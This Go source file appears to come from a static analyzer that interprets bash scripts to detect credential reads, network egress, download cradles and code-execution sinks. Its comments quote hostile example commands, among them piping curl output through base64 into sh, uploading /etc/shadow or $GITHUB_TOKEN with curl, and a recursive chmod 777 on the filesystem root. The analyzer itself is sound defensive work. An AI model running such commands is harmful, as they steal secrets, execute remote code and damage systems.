		it.substMemo = make(map[*syntax.CmdSubst]substInfo)
		it.procMemo = make(map[*syntax.ProcSubst]bool)
		it.expandSubstsIn(c)
		it.testFileReads(c)
		it.substMemo, it.procMemo = substMemo, procMemo
		it.status, it.statusKnown = 0, false
	case *syntax.LetClause:
		it.expandSubstsIn(c)
		for _, e := range c.Exprs {
			it.arithmAssignTaint(e)
		}
		it.status, it.statusKnown = 0, false
	default:
		// An unhandled construct must not silently drop its effects: record a ⊤
		// effect and a note rather than only a note.
		e := it.markTopEffect("unsupported construct at " + fromMvdanPos(c.Pos()).String())
		it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: it.src, Loc: sourceLoc(fromMvdanPos(c.Pos()), it.prog.File)})
		it.status, it.statusKnown = 0, false
	}
}

// testFileReads reports the filesystem read implied by a file-test operator in a
// `[[ … ]]` conditional ([[ -f /etc/passwd ]]), which the generic expansion does
// not model.
func (it *interp) testFileReads(c *syntax.TestClause) {
	if c == nil || c.X == nil {
		return
	}
	syntax.Walk(c.X, func(n syntax.Node) bool {
		ut, ok := n.(*syntax.UnaryTest)
		if !ok {
			return true
		}
		w, ok := ut.X.(*syntax.Word)
		if !ok {
			return true
		}
		switch ut.Op.String() {
		case "-e", "-f", "-d", "-r", "-w", "-x", "-s", "-L", "-h", "-b", "-c", "-p", "-S", "-g", "-u", "-k", "-N":
			val, known, taint := it.expandLiteral(w)
			if !known {
				// Same numeric-class confinement as a redirection: a file test
				// on out-$?.log reads within the literal directory, not ⊤.
				target := engine.ScopeTop()
				if dir, ok := it.numericConfinedDir(w); ok {
					target = engine.ScopeOf(dir)
				}
				it.emit(engine.KindFSRead, target, engine.ModeDirect, engine.CertaintyCertain, taint, it.redirectAtom(fromMvdanPos(w.Pos()), "-test"))
				return true
			}
			if val != "" {
				it.emit(engine.KindFSRead, engine.ScopeOf(val), engine.ModeDirect, engine.CertaintyCertain, taint, it.redirectAtom(fromMvdanPos(w.Pos()), "-test"))
			}
		}
		return true
	})
}

// ===========================================================================
// Pipelines and AND/OR lists
// ===========================================================================

func (it *interp) execBinary(b *syntax.BinaryCmd) {
	switch b.Op {
	case syntax.Pipe, syntax.PipeAll:
		it.execPipeline(b)
	case syntax.AndStmt, syntax.OrStmt:
		it.execAndOr(b)
	}
}

// execPipeline runs every stage of a pipeline in its own subshell copy of Σ,
// threading the (folded) standard output of each stage into the next — this is
// the pipeline's value flow. A stage that is a code-execution sink turns the
// flowing value into executed code, which the sink itself reports as ⊤ when it
// is dispatched.
func (it *interp) execPipeline(b *syntax.BinaryCmd) {
	stages := it.flattenPipeline(b)

	savedIn, savedKnown, savedTaint, savedNet := it.stdin, it.stdinKnown, it.stdinTaint, it.stdinNet
	savedFed := it.stdinFed
	in, inKnown, inTaint, inNet := it.stdin, it.stdinKnown, it.stdinTaint, it.stdinNet
	inFed := it.stdinFed
	for i, st := range stages {
		it.stdin, it.stdinKnown, it.stdinTaint, it.stdinNet = in, inKnown, inTaint, inNet
		// Every stage after the first is fed by its predecessor's output, so a
		// command language arriving through a pipe is a real stdin feed
		// (Finding 60).
		it.stdinFed = inFed || i > 0
		savedState := it.state
		savedCtl := it.ctl
		it.state = it.state.Clone()
		// Each pipeline stage runs in its own subshell; confine any control-flow
		// signal it raises so it cannot abort the enclosing statement list.
		it.ctl = ctlNone
		it.stdout, it.stdoutKnown, it.stdoutTaint = "", false, engine.TaintBottom()
		effStart := len(it.effs)
		it.execStmt(st)
		out, ok, outTaint := it.stdout, it.stdoutKnown, it.stdoutTaint
		it.state = savedState
		it.ctl = savedCtl
		in, inKnown, inTaint = out, ok, outTaint
		// The value flowing to the next stage came from a network egress when
		// this stage — or any earlier one of the pipeline — contributed a
		// NetEgress effect: the downstream sink is then fed by network content
		// (the download-cradle flow). It is OR-ed rather than assigned, so a
		// stage that adds no egress of its own but only passes the bytes on
		// (tee, cat, tr, grep, base64 -d, …) cannot reset a flow already
		// established upstream: `curl … | base64 -d | sh` is a cradle too.
		inNet = inNet || stageHasNetEgress(it.effs[effStart:])
	}
	it.stdin, it.stdinKnown, it.stdinTaint, it.stdinNet = savedIn, savedKnown, savedTaint, savedNet
	it.stdinFed = savedFed
	it.status, it.statusKnown = 0, false
}

// stageHasNetEgress reports whether a pipeline stage contributed a NetEgress
// effect, so the value it folds to the next stage is network content.
func stageHasNetEgress(effs []engine.Effect) bool {
	for _, e := range effs {
		if e.Kind == engine.KindNetEgress {
			return true
		}
	}
	return false
}

func (it *interp) flattenPipeline(b *syntax.BinaryCmd) []*syntax.Stmt {
	var out []*syntax.Stmt
	var walk func(x *syntax.Stmt)
	walk = func(x *syntax.Stmt) {
		if x == nil {
			return
		}
		if bc, ok := x.Cmd.(*syntax.BinaryCmd); ok && (bc.Op == syntax.Pipe || bc.Op == syntax.PipeAll) {
			walk(bc.X)
			walk(bc.Y)
			return
		}
		out = append(out, x)
	}
	walk(b.X)
	walk(b.Y)
	return out
}

// execAndOr runs the right-hand side only when the left-hand side's exit status
// makes it reachable; an unknown status conservatively runs it.
func (it *interp) execAndOr(b *syntax.BinaryCmd) {
	it.execStmt(b.X)
	val, known := it.status, it.statusKnown
	run := true
	if known {
		if b.Op == syntax.AndStmt {
			run = val == 0
		} else {
			run = val != 0
		}
	}
	if run {
		if !known {
			// The RHS is executed only speculatively (the LHS status is
			// unknown): a terminal control-flow signal it raises must not escape
			// and abort the enclosing statement list.
			savedCtl := it.ctl
			it.ctl = ctlNone
			it.execStmt(b.Y)
			it.ctl = savedCtl
			it.statusKnown = false
			return
		}
		it.execStmt(b.Y)
	}
}

// ===========================================================================
// Control flow
// ===========================================================================

func (it *interp) execIf(c *syntax.IfClause) {
	it.execStmts(c.Cond)
	val, known := it.status, it.statusKnown
	if known {
		switch {
		case val == 0:
			if len(c.Then) == 0 {
				it.status, it.statusKnown = 0, true
			} else {
				it.execStmts(c.Then)
			}
		case c.Else == nil || (len(c.Else.Cond) == 0 && len(c.Else.Then) == 0):
			// No branch taken: an `if` that runs nothing exits 0.
			it.status, it.statusKnown = 0, true
		default:
			it.execElse(c.Else)
		}
		return
	}
	// Undecidable condition: execute both branches and join both the effects
	// (already accumulated) and the two resulting states. A control-flow signal
	// raised inside a speculatively executed branch must not escape it.
	savedCtl := it.ctl
	it.ctl = ctlNone
	base := it.state.Clone()
	it.execStmts(c.Then)
	a := it.state
	it.state = base
	it.ctl = ctlNone
	it.execElse(c.Else)
	b := it.state
	it.state = joinStates(a, b)
	it.ctl = savedCtl
	it.status, it.statusKnown = 0, false
}

func (it *interp) execElse(e *syntax.IfClause) {
	if e == nil {
		return
	}
	if len(e.Cond) > 0 { // elif
		it.execIf(e)
		return
	}
	it.execStmts(e.Then)
}

func (it *interp) execWhile(c *syntax.WhileClause) {
	it.loopDepth++
	defer func() { it.loopDepth-- }()
	ran := false
	for {
		it.step()
		it.execStmts(c.Cond)
		val, known := it.status, it.statusKnown
		ok := val == 0
		if c.Until {
			ok = !ok
		}
		if !known {
			it.execStmts(c.Do)
			it.markTop("loop condition is not statically decidable")
			it.handleLoopCtl()
			return
		}
		if !ok {
			if !ran {
				// The loop never ran: its exit status is 0.
				it.status, it.statusKnown = 0, true
			} else {
				it.statusKnown = false
			}
			return
		}
		ran = true
		it.execStmts(c.Do)
		if it.handleLoopCtl() {
			return
		}
	}
}

func (it *interp) execFor(c *syntax.ForClause) {
	it.loopDepth++
	defer func() { it.loopDepth-- }()
	switch loop := c.Loop.(type) {
	case *syntax.WordIter:
		name := ""
		if loop.Name != nil {
			name = loop.Name.Value
		}
		if !loop.InPos.IsValid() && len(loop.Items) == 0 {
			it.state.SetUnknown(name, engine.TaintBottom())
			it.execStmts(c.Do)
			it.markTop("for-loop over positional parameters")
			it.handleLoopCtl()
			return
		}
		var vals []string
		known := true
		for _, w := range loop.Items {
			ew := it.expandFields(w)
			if !ew.known {
				known = false
			}
			vals = append(vals, ew.fields...)
		}
		if !known {
			it.state.SetUnknown(name, engine.TaintBottom())
			it.execStmts(c.Do)
			it.markTop("for-loop over a dynamically-known word list")
			it.handleLoopCtl()
			return
		}
		for _, v := range vals {
			it.step()
			if name != "" {
				it.state.SetKnown(name, v, engine.TaintBottom())
			}
			it.execStmts(c.Do)
			if it.handleLoopCtl() {
				return
			}
		}
		if len(vals) == 0 {
			// The loop ran no iterations: its exit status is 0.
			it.status, it.statusKnown = 0, true
		}

	case *syntax.CStyleLoop:
		// Walk the arithmetic clauses so any command/process substitution in the
		// init/cond/post expressions is executed (its effects recorded).
		if loop.Init != nil {
			it.expandSubstsIn(loop.Init)
		}
		if loop.Cond != nil {
			it.expandSubstsIn(loop.Cond)
		}
		if loop.Post != nil {
			it.expandSubstsIn(loop.Post)
		}
		// Without modelling the arithmetic, a C-style loop is treated like a
		// loop with an unknown bound: iterate until the budget stops it.
		for {
			it.step()
			it.execStmts(c.Do)
			if it.handleLoopCtl() {
				return
			}
		}
	}
}

// handleLoopCtl consumes a break/continue issued by a loop body, returning true
// when the loop must stop (break, or an enclosing return/exit).
func (it *interp) handleLoopCtl() (stop bool) {
	switch it.ctl {
	case ctlBreak:
		it.ctl = ctlNone
		return true
	case ctlContinue:
		it.ctl = ctlNone
		return false
	case ctlReturn, ctlExit:
		return true
	}
	return false
}

func (it *interp) execCase(c *syntax.CaseClause) {
	subj := ""
	known := true
	if c.Word != nil {
		subj, known, _ = it.expandLiteral(c.Word)
	}
	if !known {
		for _, item := range c.Items {
			it.execStmts(item.Stmts)
		}
		it.markTop("case subject is not statically decidable")
		return
	}
	defIdx := -1
	for i, item := range c.Items {
		if len(item.Patterns) == 0 {
			if defIdx < 0 {
				defIdx = i
			}
			continue
		}
		matched, unknown := it.caseMatch(subj, item.Patterns)
		if unknown {
			// A pattern that cannot be decided (a dynamic word) might match:
			// run its arm and degrade to ⊤ rather than silently drop it.
			it.execStmts(item.Stmts)
			it.markTop("case pattern is not statically decidable")
			return
		}
		if !matched {
			continue
		}
		it.execStmts(item.Stmts)
		switch item.Op.String() {
		case ";&":
			// Fall through: run every following arm's body until one ends in
			// ";;" (a ";"-terminated arm does not continue the fall-through).
			for j := i + 1; j < len(c.Items); j++ {
				it.execStmts(c.Items[j].Stmts)
				if c.Items[j].Op.String() != ";&" {
					break
				}
			}
		case ";;&":
			// Resume matching: keep testing the remaining arms.
			for j := i + 1; j < len(c.Items); j++ {
				m2, unk2 := it.caseMatch(subj, c.Items[j].Patterns)
				if unk2 {
					it.execStmts(c.Items[j].Stmts)
					it.markTop("case pattern is not statically decidable")
					return
				}
				if m2 {
					it.execStmts(c.Items[j].Stmts)
					if c.Items[j].Op.String() != ";;&" {
						break
					}
				}
			}
		}
		return
	}
	if defIdx >= 0 {
		it.execStmts(c.Items[defIdx].Stmts)
		return
	}
	// No arm matched and there is no default: the case exits 0.
	it.status, it.statusKnown = 0, true
}

// caseMatch reports whether any of pats matches subj. The second result is true
// when a pattern cannot be decided statically (it must then be treated as
// possibly matching, never as a non-match).
func (it *interp) caseMatch(subj string, pats []*syntax.Word) (matched, unknown bool) {
	for _, p := range pats {
		pat, ok := it.casePattern(p)
		if !ok {
			return false, true
		}
		m, ok := globMatch(pat, subj)
		if !ok {
			// The pattern uses a construct the matcher cannot faithfully
			// evaluate: it must be treated as possibly matching, never as a
			// non-match, so the arm is not silently dropped.
			return false, true
		}
		if m {
			return true, false
		}
	}
	return false, false
}

// casePattern expands a case pattern word to its pattern text. A pattern word is
// "known" even when it contains shell glob syntax (a legitimate part of a case
// pattern), so only a genuinely dynamic word yields ok=false.
func (it *interp) casePattern(p *syntax.Word) (string, bool) {
	if p == nil {
		return "", true
	}
	if !it.patternKnown(p) {
		return "", false
	}
	var out string
	bad := false
	func() {
		defer func() {
			if recover() != nil {
				bad = true
			}
		}()
		s, err := expand.Literal(it.newCfg(), p)
		if err != nil {
			bad = true
			return
		}
		out = s
	}()
	if bad {
		return "", false
	}
	return out, true
}

// patternKnown reports whether a case-pattern word's text is statically
// determinable; unlike wordKnown, unquoted glob metacharacters are treated as
// known pattern syntax rather than as unknown content.
func (it *interp) patternKnown(w *syntax.Word) bool {
	if w == nil {
		return true
	}
	for _, p := range w.Parts {
		if !it.patternPartKnown(p) {
			return false
		}
	}
	return true
}

func (it *interp) patternPartKnown(p syntax.WordPart) bool {
	switch p := p.(type) {
	case *syntax.Lit:
		return true
	case *syntax.SglQuoted:
		return true
	case *syntax.DblQuoted:
		for _, ip := range p.Parts {
			if !it.partKnown(ip, true) {
				return false
			}
		}
		return true
	case *syntax.ExtGlob:
		return true
	default:
		return it.partKnown(p, false)
	}
}

func (it *interp) execFuncDecl(c *syntax.FuncDecl) {
	if c.Name == nil {
		return
	}
	name := c.Name.Value
	it.funcRaw[name] = c
	if it.state.Funcs == nil {
		it.state.Funcs = map[string]*Func{}
	}
	it.state.Funcs[name] = &Func{Pos: fromMvdanPos(c.Name.Pos()), Name: name}
}

// execDecl applies the state component of declare/local/export/readonly and asks
// the resolver for the effects the declaration itself contributes. Option flags
// are forwarded to the binder (so a KB flag such as `export -p` matches), and
// the operand is the variable NAME (not NAME=value).
func (it *interp) execDecl(c *syntax.DeclClause) {
	variant := ""
	if c.Variant != nil {
		variant = c.Variant.Value
	}
	var (
		flags     []string
		opNames   []string
		nameref   bool
		integer   bool
		unmodeled bool
	)
	for _, a := range c.Args {
		if a == nil {
			continue
		}
		if a.Name == nil {
			// A flag (or a name-only operand): both carry their text in Value.
			if a.Value == nil {
				continue
			}
			v, ok := literalOf(a.Value)
			if !ok {
				continue
			}
			flags = append(flags, v)
			switch v {
			case "-n":
				nameref = true
			case "-i":
				integer = true
			case "-l", "-u":
				unmodeled = true
			}
			continue
		}
		name := a.Name.Value
		if name == "" {
			continue
		}
		val, known := "", true
		taint := engine.TaintBottom()
		if a.Value != nil {
			val, known, taint = it.expandLiteral(a.Value)
		}
		if a.Array != nil {
			// An array literal `a=( … )` expands every element, so a command or
			// process substitution inside it runs — exactly as the plain
			// assignment path does. The declaration spelling used to walk only
			// a.Value, which is nil for an array literal, so the payload
			// disappeared from the report (Finding 40).
			for _, el := range a.Array.Elems {
				if el == nil || el.Value == nil {
					continue
				}
				_, _, tel := it.expandLiteral(el.Value)
				taint = taint.Join(tel)
			}
			known = false
		}
		if promptVars[name] && valueReexecutes(a.Value) {
			// bash re-scans the prompt variable's value on the next traced
			// command, which executes the substitutions it stores: the
			// assignment is a code sink (Finding 73).
			e := it.markTopEffect("prompt variable " + strconv.Quote(name) + " re-executes its value")
			it.derive(e, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(fromMvdanPos(a.Pos()), it.prog.File)})
			it.state.SetUnknown(name, taint)
			opNames = append(opNames, name)
			continue
		}
		// Finding 45: an `export`/`declare` of a variable whose value the
		// runtime executes (JAVA_TOOL_OPTIONS, LD_PRELOAD, SSH_ASKPASS, …) is a
		// code-execution sink, exactly like the prefix-assignment spelling.
		if ee, ok := ExecEnvEffect(name, val, known, taint); ok {
			it.effs = append(it.effs, ee)
			it.derive(ee, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(fromMvdanPos(a.Pos()), it.prog.File)})
		}
		// `export PATH=…` and `declare -a BASH_CMDS=…` reach the same
		// resolution state the plain assignment does (Finding 90).
		it.resolutionAssign(name, a.Index != nil, a.Append, known, val)
		switch {
		case nameref:
			// A nameref aliases another variable; it is not resolved, so reads of
			// it must degrade to ⊤ rather than yield the target's name — but the
			// target it names is recorded, so a later assignment to the target
			// is still visible through the reference (Finding 51).
			it.state.SetUnknown(name, taint)
			if known && val != "" {
				if v := it.state.Get(name); v != nil {
					v.Ref = val
				}
			}
		case unmodeled:
			// -l/-u (case folding) are not modelled: invalidate the value.
			it.state.SetUnknown(name, taint)
		case integer:
			// -i makes later assignments arithmetic; the value is not evaluated,
			// so mark the variable integer and leave it unknown until assigned.
			it.state.SetUnknown(name, taint)
			it.state.MarkInteger(name)
		case known:
			it.state.SetKnown(name, val, taint)
		default:
			it.state.SetUnknown(name, taint)
		}
		if v := it.state.Get(name); v != nil {
			switch variant {
			case "export":
				v.Export = true
			case "readonly":
				v.Readonly = true
			}
		}
		opNames = append(opNames, name)
	}
	if variant == "" || it.res == nil {
		return
	}
	cmd := &Command{Pos: fromMvdanPos(c.Pos()), Name: variant, NameWord: &Word{Value: variant, Literal: true}}
	for _, f := range flags {
		cmd.Args = append(cmd.Args, &Word{Value: f, Literal: true})
	}
	for _, n := range opNames {
		cmd.Args = append(cmd.Args, &Word{Value: n, Literal: true})
	}
	it.addCmd(cmd)
	declRes := it.res(cmd, it.resolutionProgram())
	it.effs = append(it.effs, declRes.Effects...)
	it.ders = append(it.ders, declRes.Derivations...)
	// A declaration that prints the variable set (`export -p`, `declare -p`,
	// `readonly -p`) writes that set to standard output, and the environment it
	// prints is the one the process holds — credentials included. The
	// declaration is a statement form of its own, so unlike a simple command it
	// never reached the stdout-provenance fold; a following pipeline stage
	// therefore received bottom-tainted stdin and `export -p | curl -d @- URL`
	// paired with nothing while its `printenv` twin paired (Finding 7).
	it.stdoutTaint = outTaintOf(declRes.Effects, it.stdinTaint)
}

// ===========================================================================
// Simple commands
// ===========================================================================

// argWord is one expanded argument together with whether it is statically known
// and the provenance of its value. pos is the source position of the word it
// came from, so the normalized invocation keeps a location for the binding
// layer's why-trace atoms. dir carries the numeric-class confinement of a
// dynamic word (see numericConfinedDir); empty means unconfined.
type argWord struct {
	val   string
	lit   bool
	taint engine.Taint
	pos   Pos
	dir   string
	// root marks a literal relative operand that the tracked working directory
	// resolves to the filesystem root (Finding 70). The value keeps its written
	// form; the binding layer resolves it where an effect's extent is graded.
	root bool
	// fromXargs marks an operand whose value xargs substitutes from its input
	// items (Finding 92). The value is data, not text, so it is unknown (⊤);
	// a parameter that reads a file therefore reads a path the analysis cannot
	// name, and the binding layer reports that read as secret-bearing.
	fromXargs bool
}

// wordDir computes the confinement of one source word for the fields it
// contributed: a fully known word is literal (no confinement needed), and a
// dynamic word is confined only when every dynamic part is numeric-class.
func (it *interp) wordDir(w *syntax.Word, known bool) string {
	if w == nil || known {
		return ""
	}
	if dir, ok := it.numericConfinedDir(w); ok {
		return dir
	}
	return ""
}

func (it *interp) execCall(c *syntax.CallExpr) {
	// Effects from the start of this command — including the filesystem reads a
	// command substitution performs while the command's words are expanded — are
	// what determine the provenance of its stdout, so note where they begin.
	effStart := len(it.effs)
	it.stdout, it.stdoutKnown, it.stdoutTaint = "", false, engine.TaintBottom()

	// 1. Environment assignments. A bare assignment persists in Σ; an
	// assignment prefixing a command only applies to that command.
	var assigns []*Assign
	for _, a := range c.Assigns {
		if a == nil || a.Name == nil {
			continue
		}
		name := a.Name.Value
		val, known := "", true
		taint := engine.TaintBottom()
		switch {
		case a.Index != nil:
			// A subscripted assignment a[expr]=v: execute any substitutions in
			// the subscript, then treat the value as unknown (the subscript's
			// value is not modelled).
			it.expandSubstsIn(a.Index)
			if a.Value != nil {
				val, _, taint = it.expandLiteral(a.Value)
			}
			known = false
		case a.Array != nil:
			// a=( … ): expand every element so nested command/process
			// substitutions run, and record the result as unknown.
			for _, el := range a.Array.Elems {
				if el == nil || el.Value == nil {
					continue
				}
				_, _, tel := it.expandLiteral(el.Value)
				taint = taint.Join(tel)
			}
			known = false
		case a.Value != nil:
			val, known, taint = it.expandLiteral(a.Value)
		}
		// A credential held in the environment taints the assigned value
		// (Finding 7): x=$GITHUB_TOKEN stores the token, so a later upload of
		// "$x" carries secret provenance even though the expansion of a plain
		// shell variable reports nothing on its own.
		taint = taint.Join(it.envCredentialTaint(a.Value))
		if a.Array != nil {
			for _, el := range a.Array.Elems {
				if el != nil {
					taint = taint.Join(it.envCredentialTaint(el.Value))
				}
			}
		}
		as := &Assign{Pos: fromMvdanPos(a.Pos()), Name: name, Append: a.Append}
		as.Value = &Word{Value: val, Literal: known, Taint: taint}
		assigns = append(assigns, as)
		ew := envWriteEffect(name, taint)
		it.effs = append(it.effs, ew)
		it.derive(ew, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(as.Pos, it.prog.File)})
		if ee, ok := ExecEnvEffect(name, val, known, taint); ok {
			it.effs = append(it.effs, ee)
			it.derive(ee, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(as.Pos, it.prog.File)})
		}
		// PATH and BASH_CMDS change which binary a LATER name runs (Finding 90).
		it.resolutionAssign(name, a.Index != nil, a.Append, known, val)
		if promptVars[name] && valueReexecutes(a.Value) {
			// A prompt/trace variable whose value stores a substitution is
			// expanded as code on the next traced command (Finding 73).
			e := it.markTopEffect("prompt variable " + strconv.Quote(name) + " re-executes its value")
			it.derive(e, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(as.Pos, it.prog.File)})
		}
		if len(c.Args) == 0 {
			switch {
			case a.Array != nil || a.Index != nil:
				it.state.SetUnknown(name, taint)
			case a.Append:
				// name+=value appends to the existing value.
				if prev := it.state.Get(name); prev != nil && prev.Set && prev.Known {
					it.state.SetKnown(name, prev.Value+val, taint.Join(prev.Taint))
				} else if prev := it.state.Get(name); prev != nil && prev.Set {
					it.state.SetUnknown(name, taint)
				} else {
					it.state.SetKnown(name, val, taint)
				}
			case known:
				if prev := it.state.Get(name); prev != nil && prev.Int {
					// `declare -i x; x=1+1` — the assignment is arithmetic.
					it.state.SetUnknown(name, taint)
				} else {
					it.state.SetKnown(name, val, taint)
				}
			default:
				it.state.SetUnknown(name, taint)
			}
		}
	}

	// 2. Peel recognized wrappers (sudo, env, …) and pick up the environment
	// they donate, reusing the normalizer's unwrapping.
	wrappers, wEnv, start := it.norm.unwrap(c.Args)
	for _, we := range wEnv {
		assigns = append(assigns, we)
		ew := envWriteEffect(we.Name, engine.TaintBottom())
		it.effs = append(it.effs, ew)
		it.derive(ew, engine.Atom{Kind: engine.AtomLiteral, Text: we.Name, Loc: sourceLoc(we.Pos, it.prog.File)})
		if we.Value != nil {
			if ee, ok := ExecEnvEffect(we.Name, we.Value.Value, we.Value.Literal, engine.TaintBottom()); ok {
				it.effs = append(it.effs, ee)
				it.derive(ee, engine.Atom{Kind: engine.AtomLiteral, Text: we.Name, Loc: sourceLoc(we.Pos, it.prog.File)})
			}
			// `env PATH=… cmd` rebinds the following name in the same
			// invocation, so the resolution state changes before it is used
			// (Finding 90).
			it.resolutionAssign(we.Name, false, false, we.Value.Literal, we.Value.Value)
		}
	}
	rest := c.Args[start:]

	// bash expands an alias only for an UNQUOTED command word, so record
	// whether the word naming the command was quoted or backslash-escaped:
	// `\rm`, `'rm'` and "rm" all name the real rm, whatever alias shadows it
	// (Finding 78).
	nameQuoted := len(rest) > 0 && wordQuoted(rest[0])

	// The wrapper machinery drops the tokens it consumes (option values, fixed
	// positionals). Expand them anyway so any command/process substitution there
	// still runs and its effects are recorded.
	for _, w := range c.Args[:start] {
		it.expandFields(w)
	}

	// 3. Expand the effective command words.
	var (
		name   string
		nameOK bool
		argvW  []argWord
	)
	if len(rest) > 0 {
		if v, ok := literalOf(rest[0]); ok && (v == "[" || v == "test") {
			// `[` is the `test` builtin; as an unquoted word its `[` would be
			// read as a glob metacharacter and the whole invocation degraded to
			// ⊤ (or, quoted, dropped). Map it to `test` so its file-test operand
			// is reported.
			it.expandFields(rest[0])
			name, nameOK = v, true
		} else {
			ew0 := it.expandFields(rest[0])
			if ew0.known && len(ew0.fields) > 0 {
				name, nameOK = ew0.fields[0], true
			}
			dir0 := it.wordDir(rest[0], ew0.known)
			if !ew0.known && len(ew0.fields) == 0 {
				// A command-name word whose expansion is unknown contributes a
				// dynamic placeholder so the invocation still degrades to ⊤.
				argvW = append(argvW, argWord{val: "", lit: false, taint: ew0.taint, pos: fromMvdanPos(rest[0].Pos()), dir: dir0})
			} else {
				for _, f := range ew0.fields[min(1, len(ew0.fields)):] {
					argvW = append(argvW, argWord{val: f, lit: ew0.known, taint: ew0.taint, pos: fromMvdanPos(rest[0].Pos()), dir: dir0})
				}
			}
		}
		for _, w := range rest[1:] {
			ew := it.expandFields(w)
			dirW := it.wordDir(w, ew.known)
			if !ew.known && len(ew.fields) == 0 {
				// An unquoted, wholly-unknown expansion yields no field: keep a
				// dynamic operand so the target degrades to ⊤, not to ⊥.
				argvW = append(argvW, argWord{val: "", lit: false, taint: ew.taint, pos: fromMvdanPos(w.Pos()), dir: dirW})
				continue
			}
			for _, f := range ew.fields {
				argvW = append(argvW, argWord{val: f, lit: ew.known, taint: ew.taint, pos: fromMvdanPos(w.Pos()), dir: dirW})
			}
		}
	}

	// `test`/`[` — drop the trailing `]` operand that `[` requires.
	if name == "[" {
		name = "test"
		if n := len(argvW); n > 0 && argvW[n-1].lit && argvW[n-1].val == "]" {
			argvW = argvW[:n-1]
		}
	}

	// An xargs -I/-i/--replace placeholder stands for the (unknown) input, so
	// an operand that carries it must widen the target to ⊤ rather than be
	// taken as a concrete path. The substitution rule is textual — xargs
	// replaces *every* occurrence — so containment, not equality, is the test
	// (Finding 92). An operand whose placeholder sits in a path position names
	// a file the command opens, but a path the text does not prove: the read is
	// secret-bearing by construction, exactly like an environment read whose
	// variable name is not statically known (engine.IsSecretRead). Without it,
	// `echo /etc/shadow | xargs -I{} curl -d @{} …` bound the payload to a file
	// literally called "{}", so the credential read vanished and no
	// exfiltration pair formed while the upload was carried out.
	if repl, ok := xargsPlaceholder(wrappers); ok && repl != "" {
		for i := range argvW {
			if !strings.Contains(argvW[i].val, repl) {
				continue
			}
			argvW[i].fromXargs = true
			if xargsPlaceholderPathish(argvW[i].val, repl) {
				argvW[i].taint = argvW[i].taint.Join(engine.TaintOf(engine.TaintSecret))
			}
			argvW[i].val, argvW[i].lit = "", false
		}
	}

	// An operand that names a well-known credential location is reported as a
	// read even when the word is dynamic — a glob, a brace alternative, or a
	// path relative to the shell's current directory — because the binder can
	// only see the literal text of a known word (Findings 8/67/70). The read is
	// an over-approximation of what the command touches, never a narrowing.
	it.credentialOperandReads(argvW)

	// A credential held in the environment is a secret source (Finding 7). A
	// variable bash inherits and this program never assigns is an environment
	// read; when its name is credential-shaped the read is reported as EnvRead
	// and carries the secret label, so `curl -d "$GITHUB_TOKEN"` and
	// `x=$AWS_SECRET_ACCESS_KEY; curl -d "$x"` pair with their egress exactly as
	// the file-based spelling does.
	it.credentialEnvReads(c, rest)

	// Finding 70, breadth direction: a relative operand names the path the
	// shell resolves against its tracked working directory. Mark the ones that
	// resolve to the filesystem root so the binding layer can grade a metadata
	// change (`cd / && chmod -R 777 .`) at the extent it really touches instead
	// of treating the literal "." as one exact file.
	it.markRootOperands(argvW)

	// 4. Build the normalized invocation handed to the binding layer.
	pos := fromMvdanPos(c.Pos())
	var nameWord *Word
	if nameOK {
		nameWord = &Word{Value: name, Literal: true}
	} else if len(rest) > 0 {
		nameWord = &Word{Value: "", Literal: false}
	}
	cmd := &Command{Pos: pos, Name: name, NameWord: nameWord, Wrappers: wrappers, Assigns: assigns, StdinTaint: it.stdinTaint, Redirs: it.cmdRedirs}
	argv := make([]string, 0, len(argvW))
	for _, a := range argvW {
		cmd.Args = append(cmd.Args, &Word{Value: a.val, Literal: a.lit, Taint: a.taint, Pos: a.pos, Dir: a.dir, Root: a.root, FromXargs: a.fromXargs})
		argv = append(argv, a.val)
	}
	it.addCmd(cmd)

	// Finding 2: a command-string wrapper carries its payload as a shell
	// command line rather than as argv words (`su -c CMD`, `script -c CMD`,
	// `flock -c CMD`), so the word peel cannot reach it. The string is analysed
	// here as the invocation it performs; it is handled before the no-command
	// fast path because the string *is* the wrapper's command — the wrapper does
	// not consume the line, it consumes the command.
	stringPayload := false
	if it.findDepth < maxFindDepth {
		it.findDepth++
		stringPayload = it.commandStringPayload(name, nameOK, argv, cmd)
		it.findDepth--
	}

	// 5. No command word.
	if len(rest) == 0 {
		if len(wrappers) > 0 && !stringPayload {
			// The wrapper consumed its whole argument list (env -S '<cmd>',
			// sudo -i, timeout 5, bare env/xargs, …), leaving no effective
			// command. Degrade to ⊤ rather than fail open to an empty report.
			e := it.markTopEffect("wrapper consumed the whole command line")
			it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: wrapperText(wrappers), Loc: sourceLoc(pos, it.prog.File)})
			// The elevation knowledge for privilege wrappers (sudo) lives in
			// the binding layer, so the wrapper-only call still goes through
			// the resolver seam (sudo -i runs a root shell even without an
			// inner command).
			it.elevateWrappers(cmd, effStart)
		}
		it.stdout, it.stdoutKnown = "", true
		return
	}

	// 6. Fold stdout, then dispatch. The effects this command contributed —
	// its own, plus those its argument expansions performed — also determine
	// the provenance of what it writes to stdout, which a following pipeline
	// stage reads as its stdin.
	if nameOK {
		it.stdout, it.stdoutKnown = it.stdoutOf(name, argv)
	} else {
		it.stdout, it.stdoutKnown = "", false
	}
	it.dispatch(name, nameOK, nameQuoted, argv, cmd, effStart)
	it.stdoutTaint = outTaintOf(it.effs[effStart:], it.stdinTaint)
	// A command's output can also be the data it was handed: `printf '%s' "$x"`
	// writes its argument, and that argument's provenance must reach the next
	// pipeline stage (Finding 63's `printf … | curl -d @-` spelling). Joining the
	// argument provenance is the same per-command over-approximation outTaintOf
	// already applies to what the command reads.
	it.stdoutTaint = it.stdoutTaint.Join(it.operandTaint(cmd))
	// A credential read performed by this statement makes its egress a carrier of
	// that data: the pairing is otherwise lost whenever the secret travels
	// through an intermediate whose provenance is not modelled (a dynamic
	// operand, an unmodelled assignment) — the same rule outTaintOf applies to
	// the command's own stdout (Findings 8/51/61/62/63/67). The statement's
	// operand provenance carries the second case: a value that came from a
	// credential-shaped environment variable (x=$GITHUB_TOKEN; curl -d "$x") is
	// secret even when no secret-read effect sits in this statement (Finding 7).
	it.taintEgressWithSecret(effStart, it.operandTaint(cmd))
}

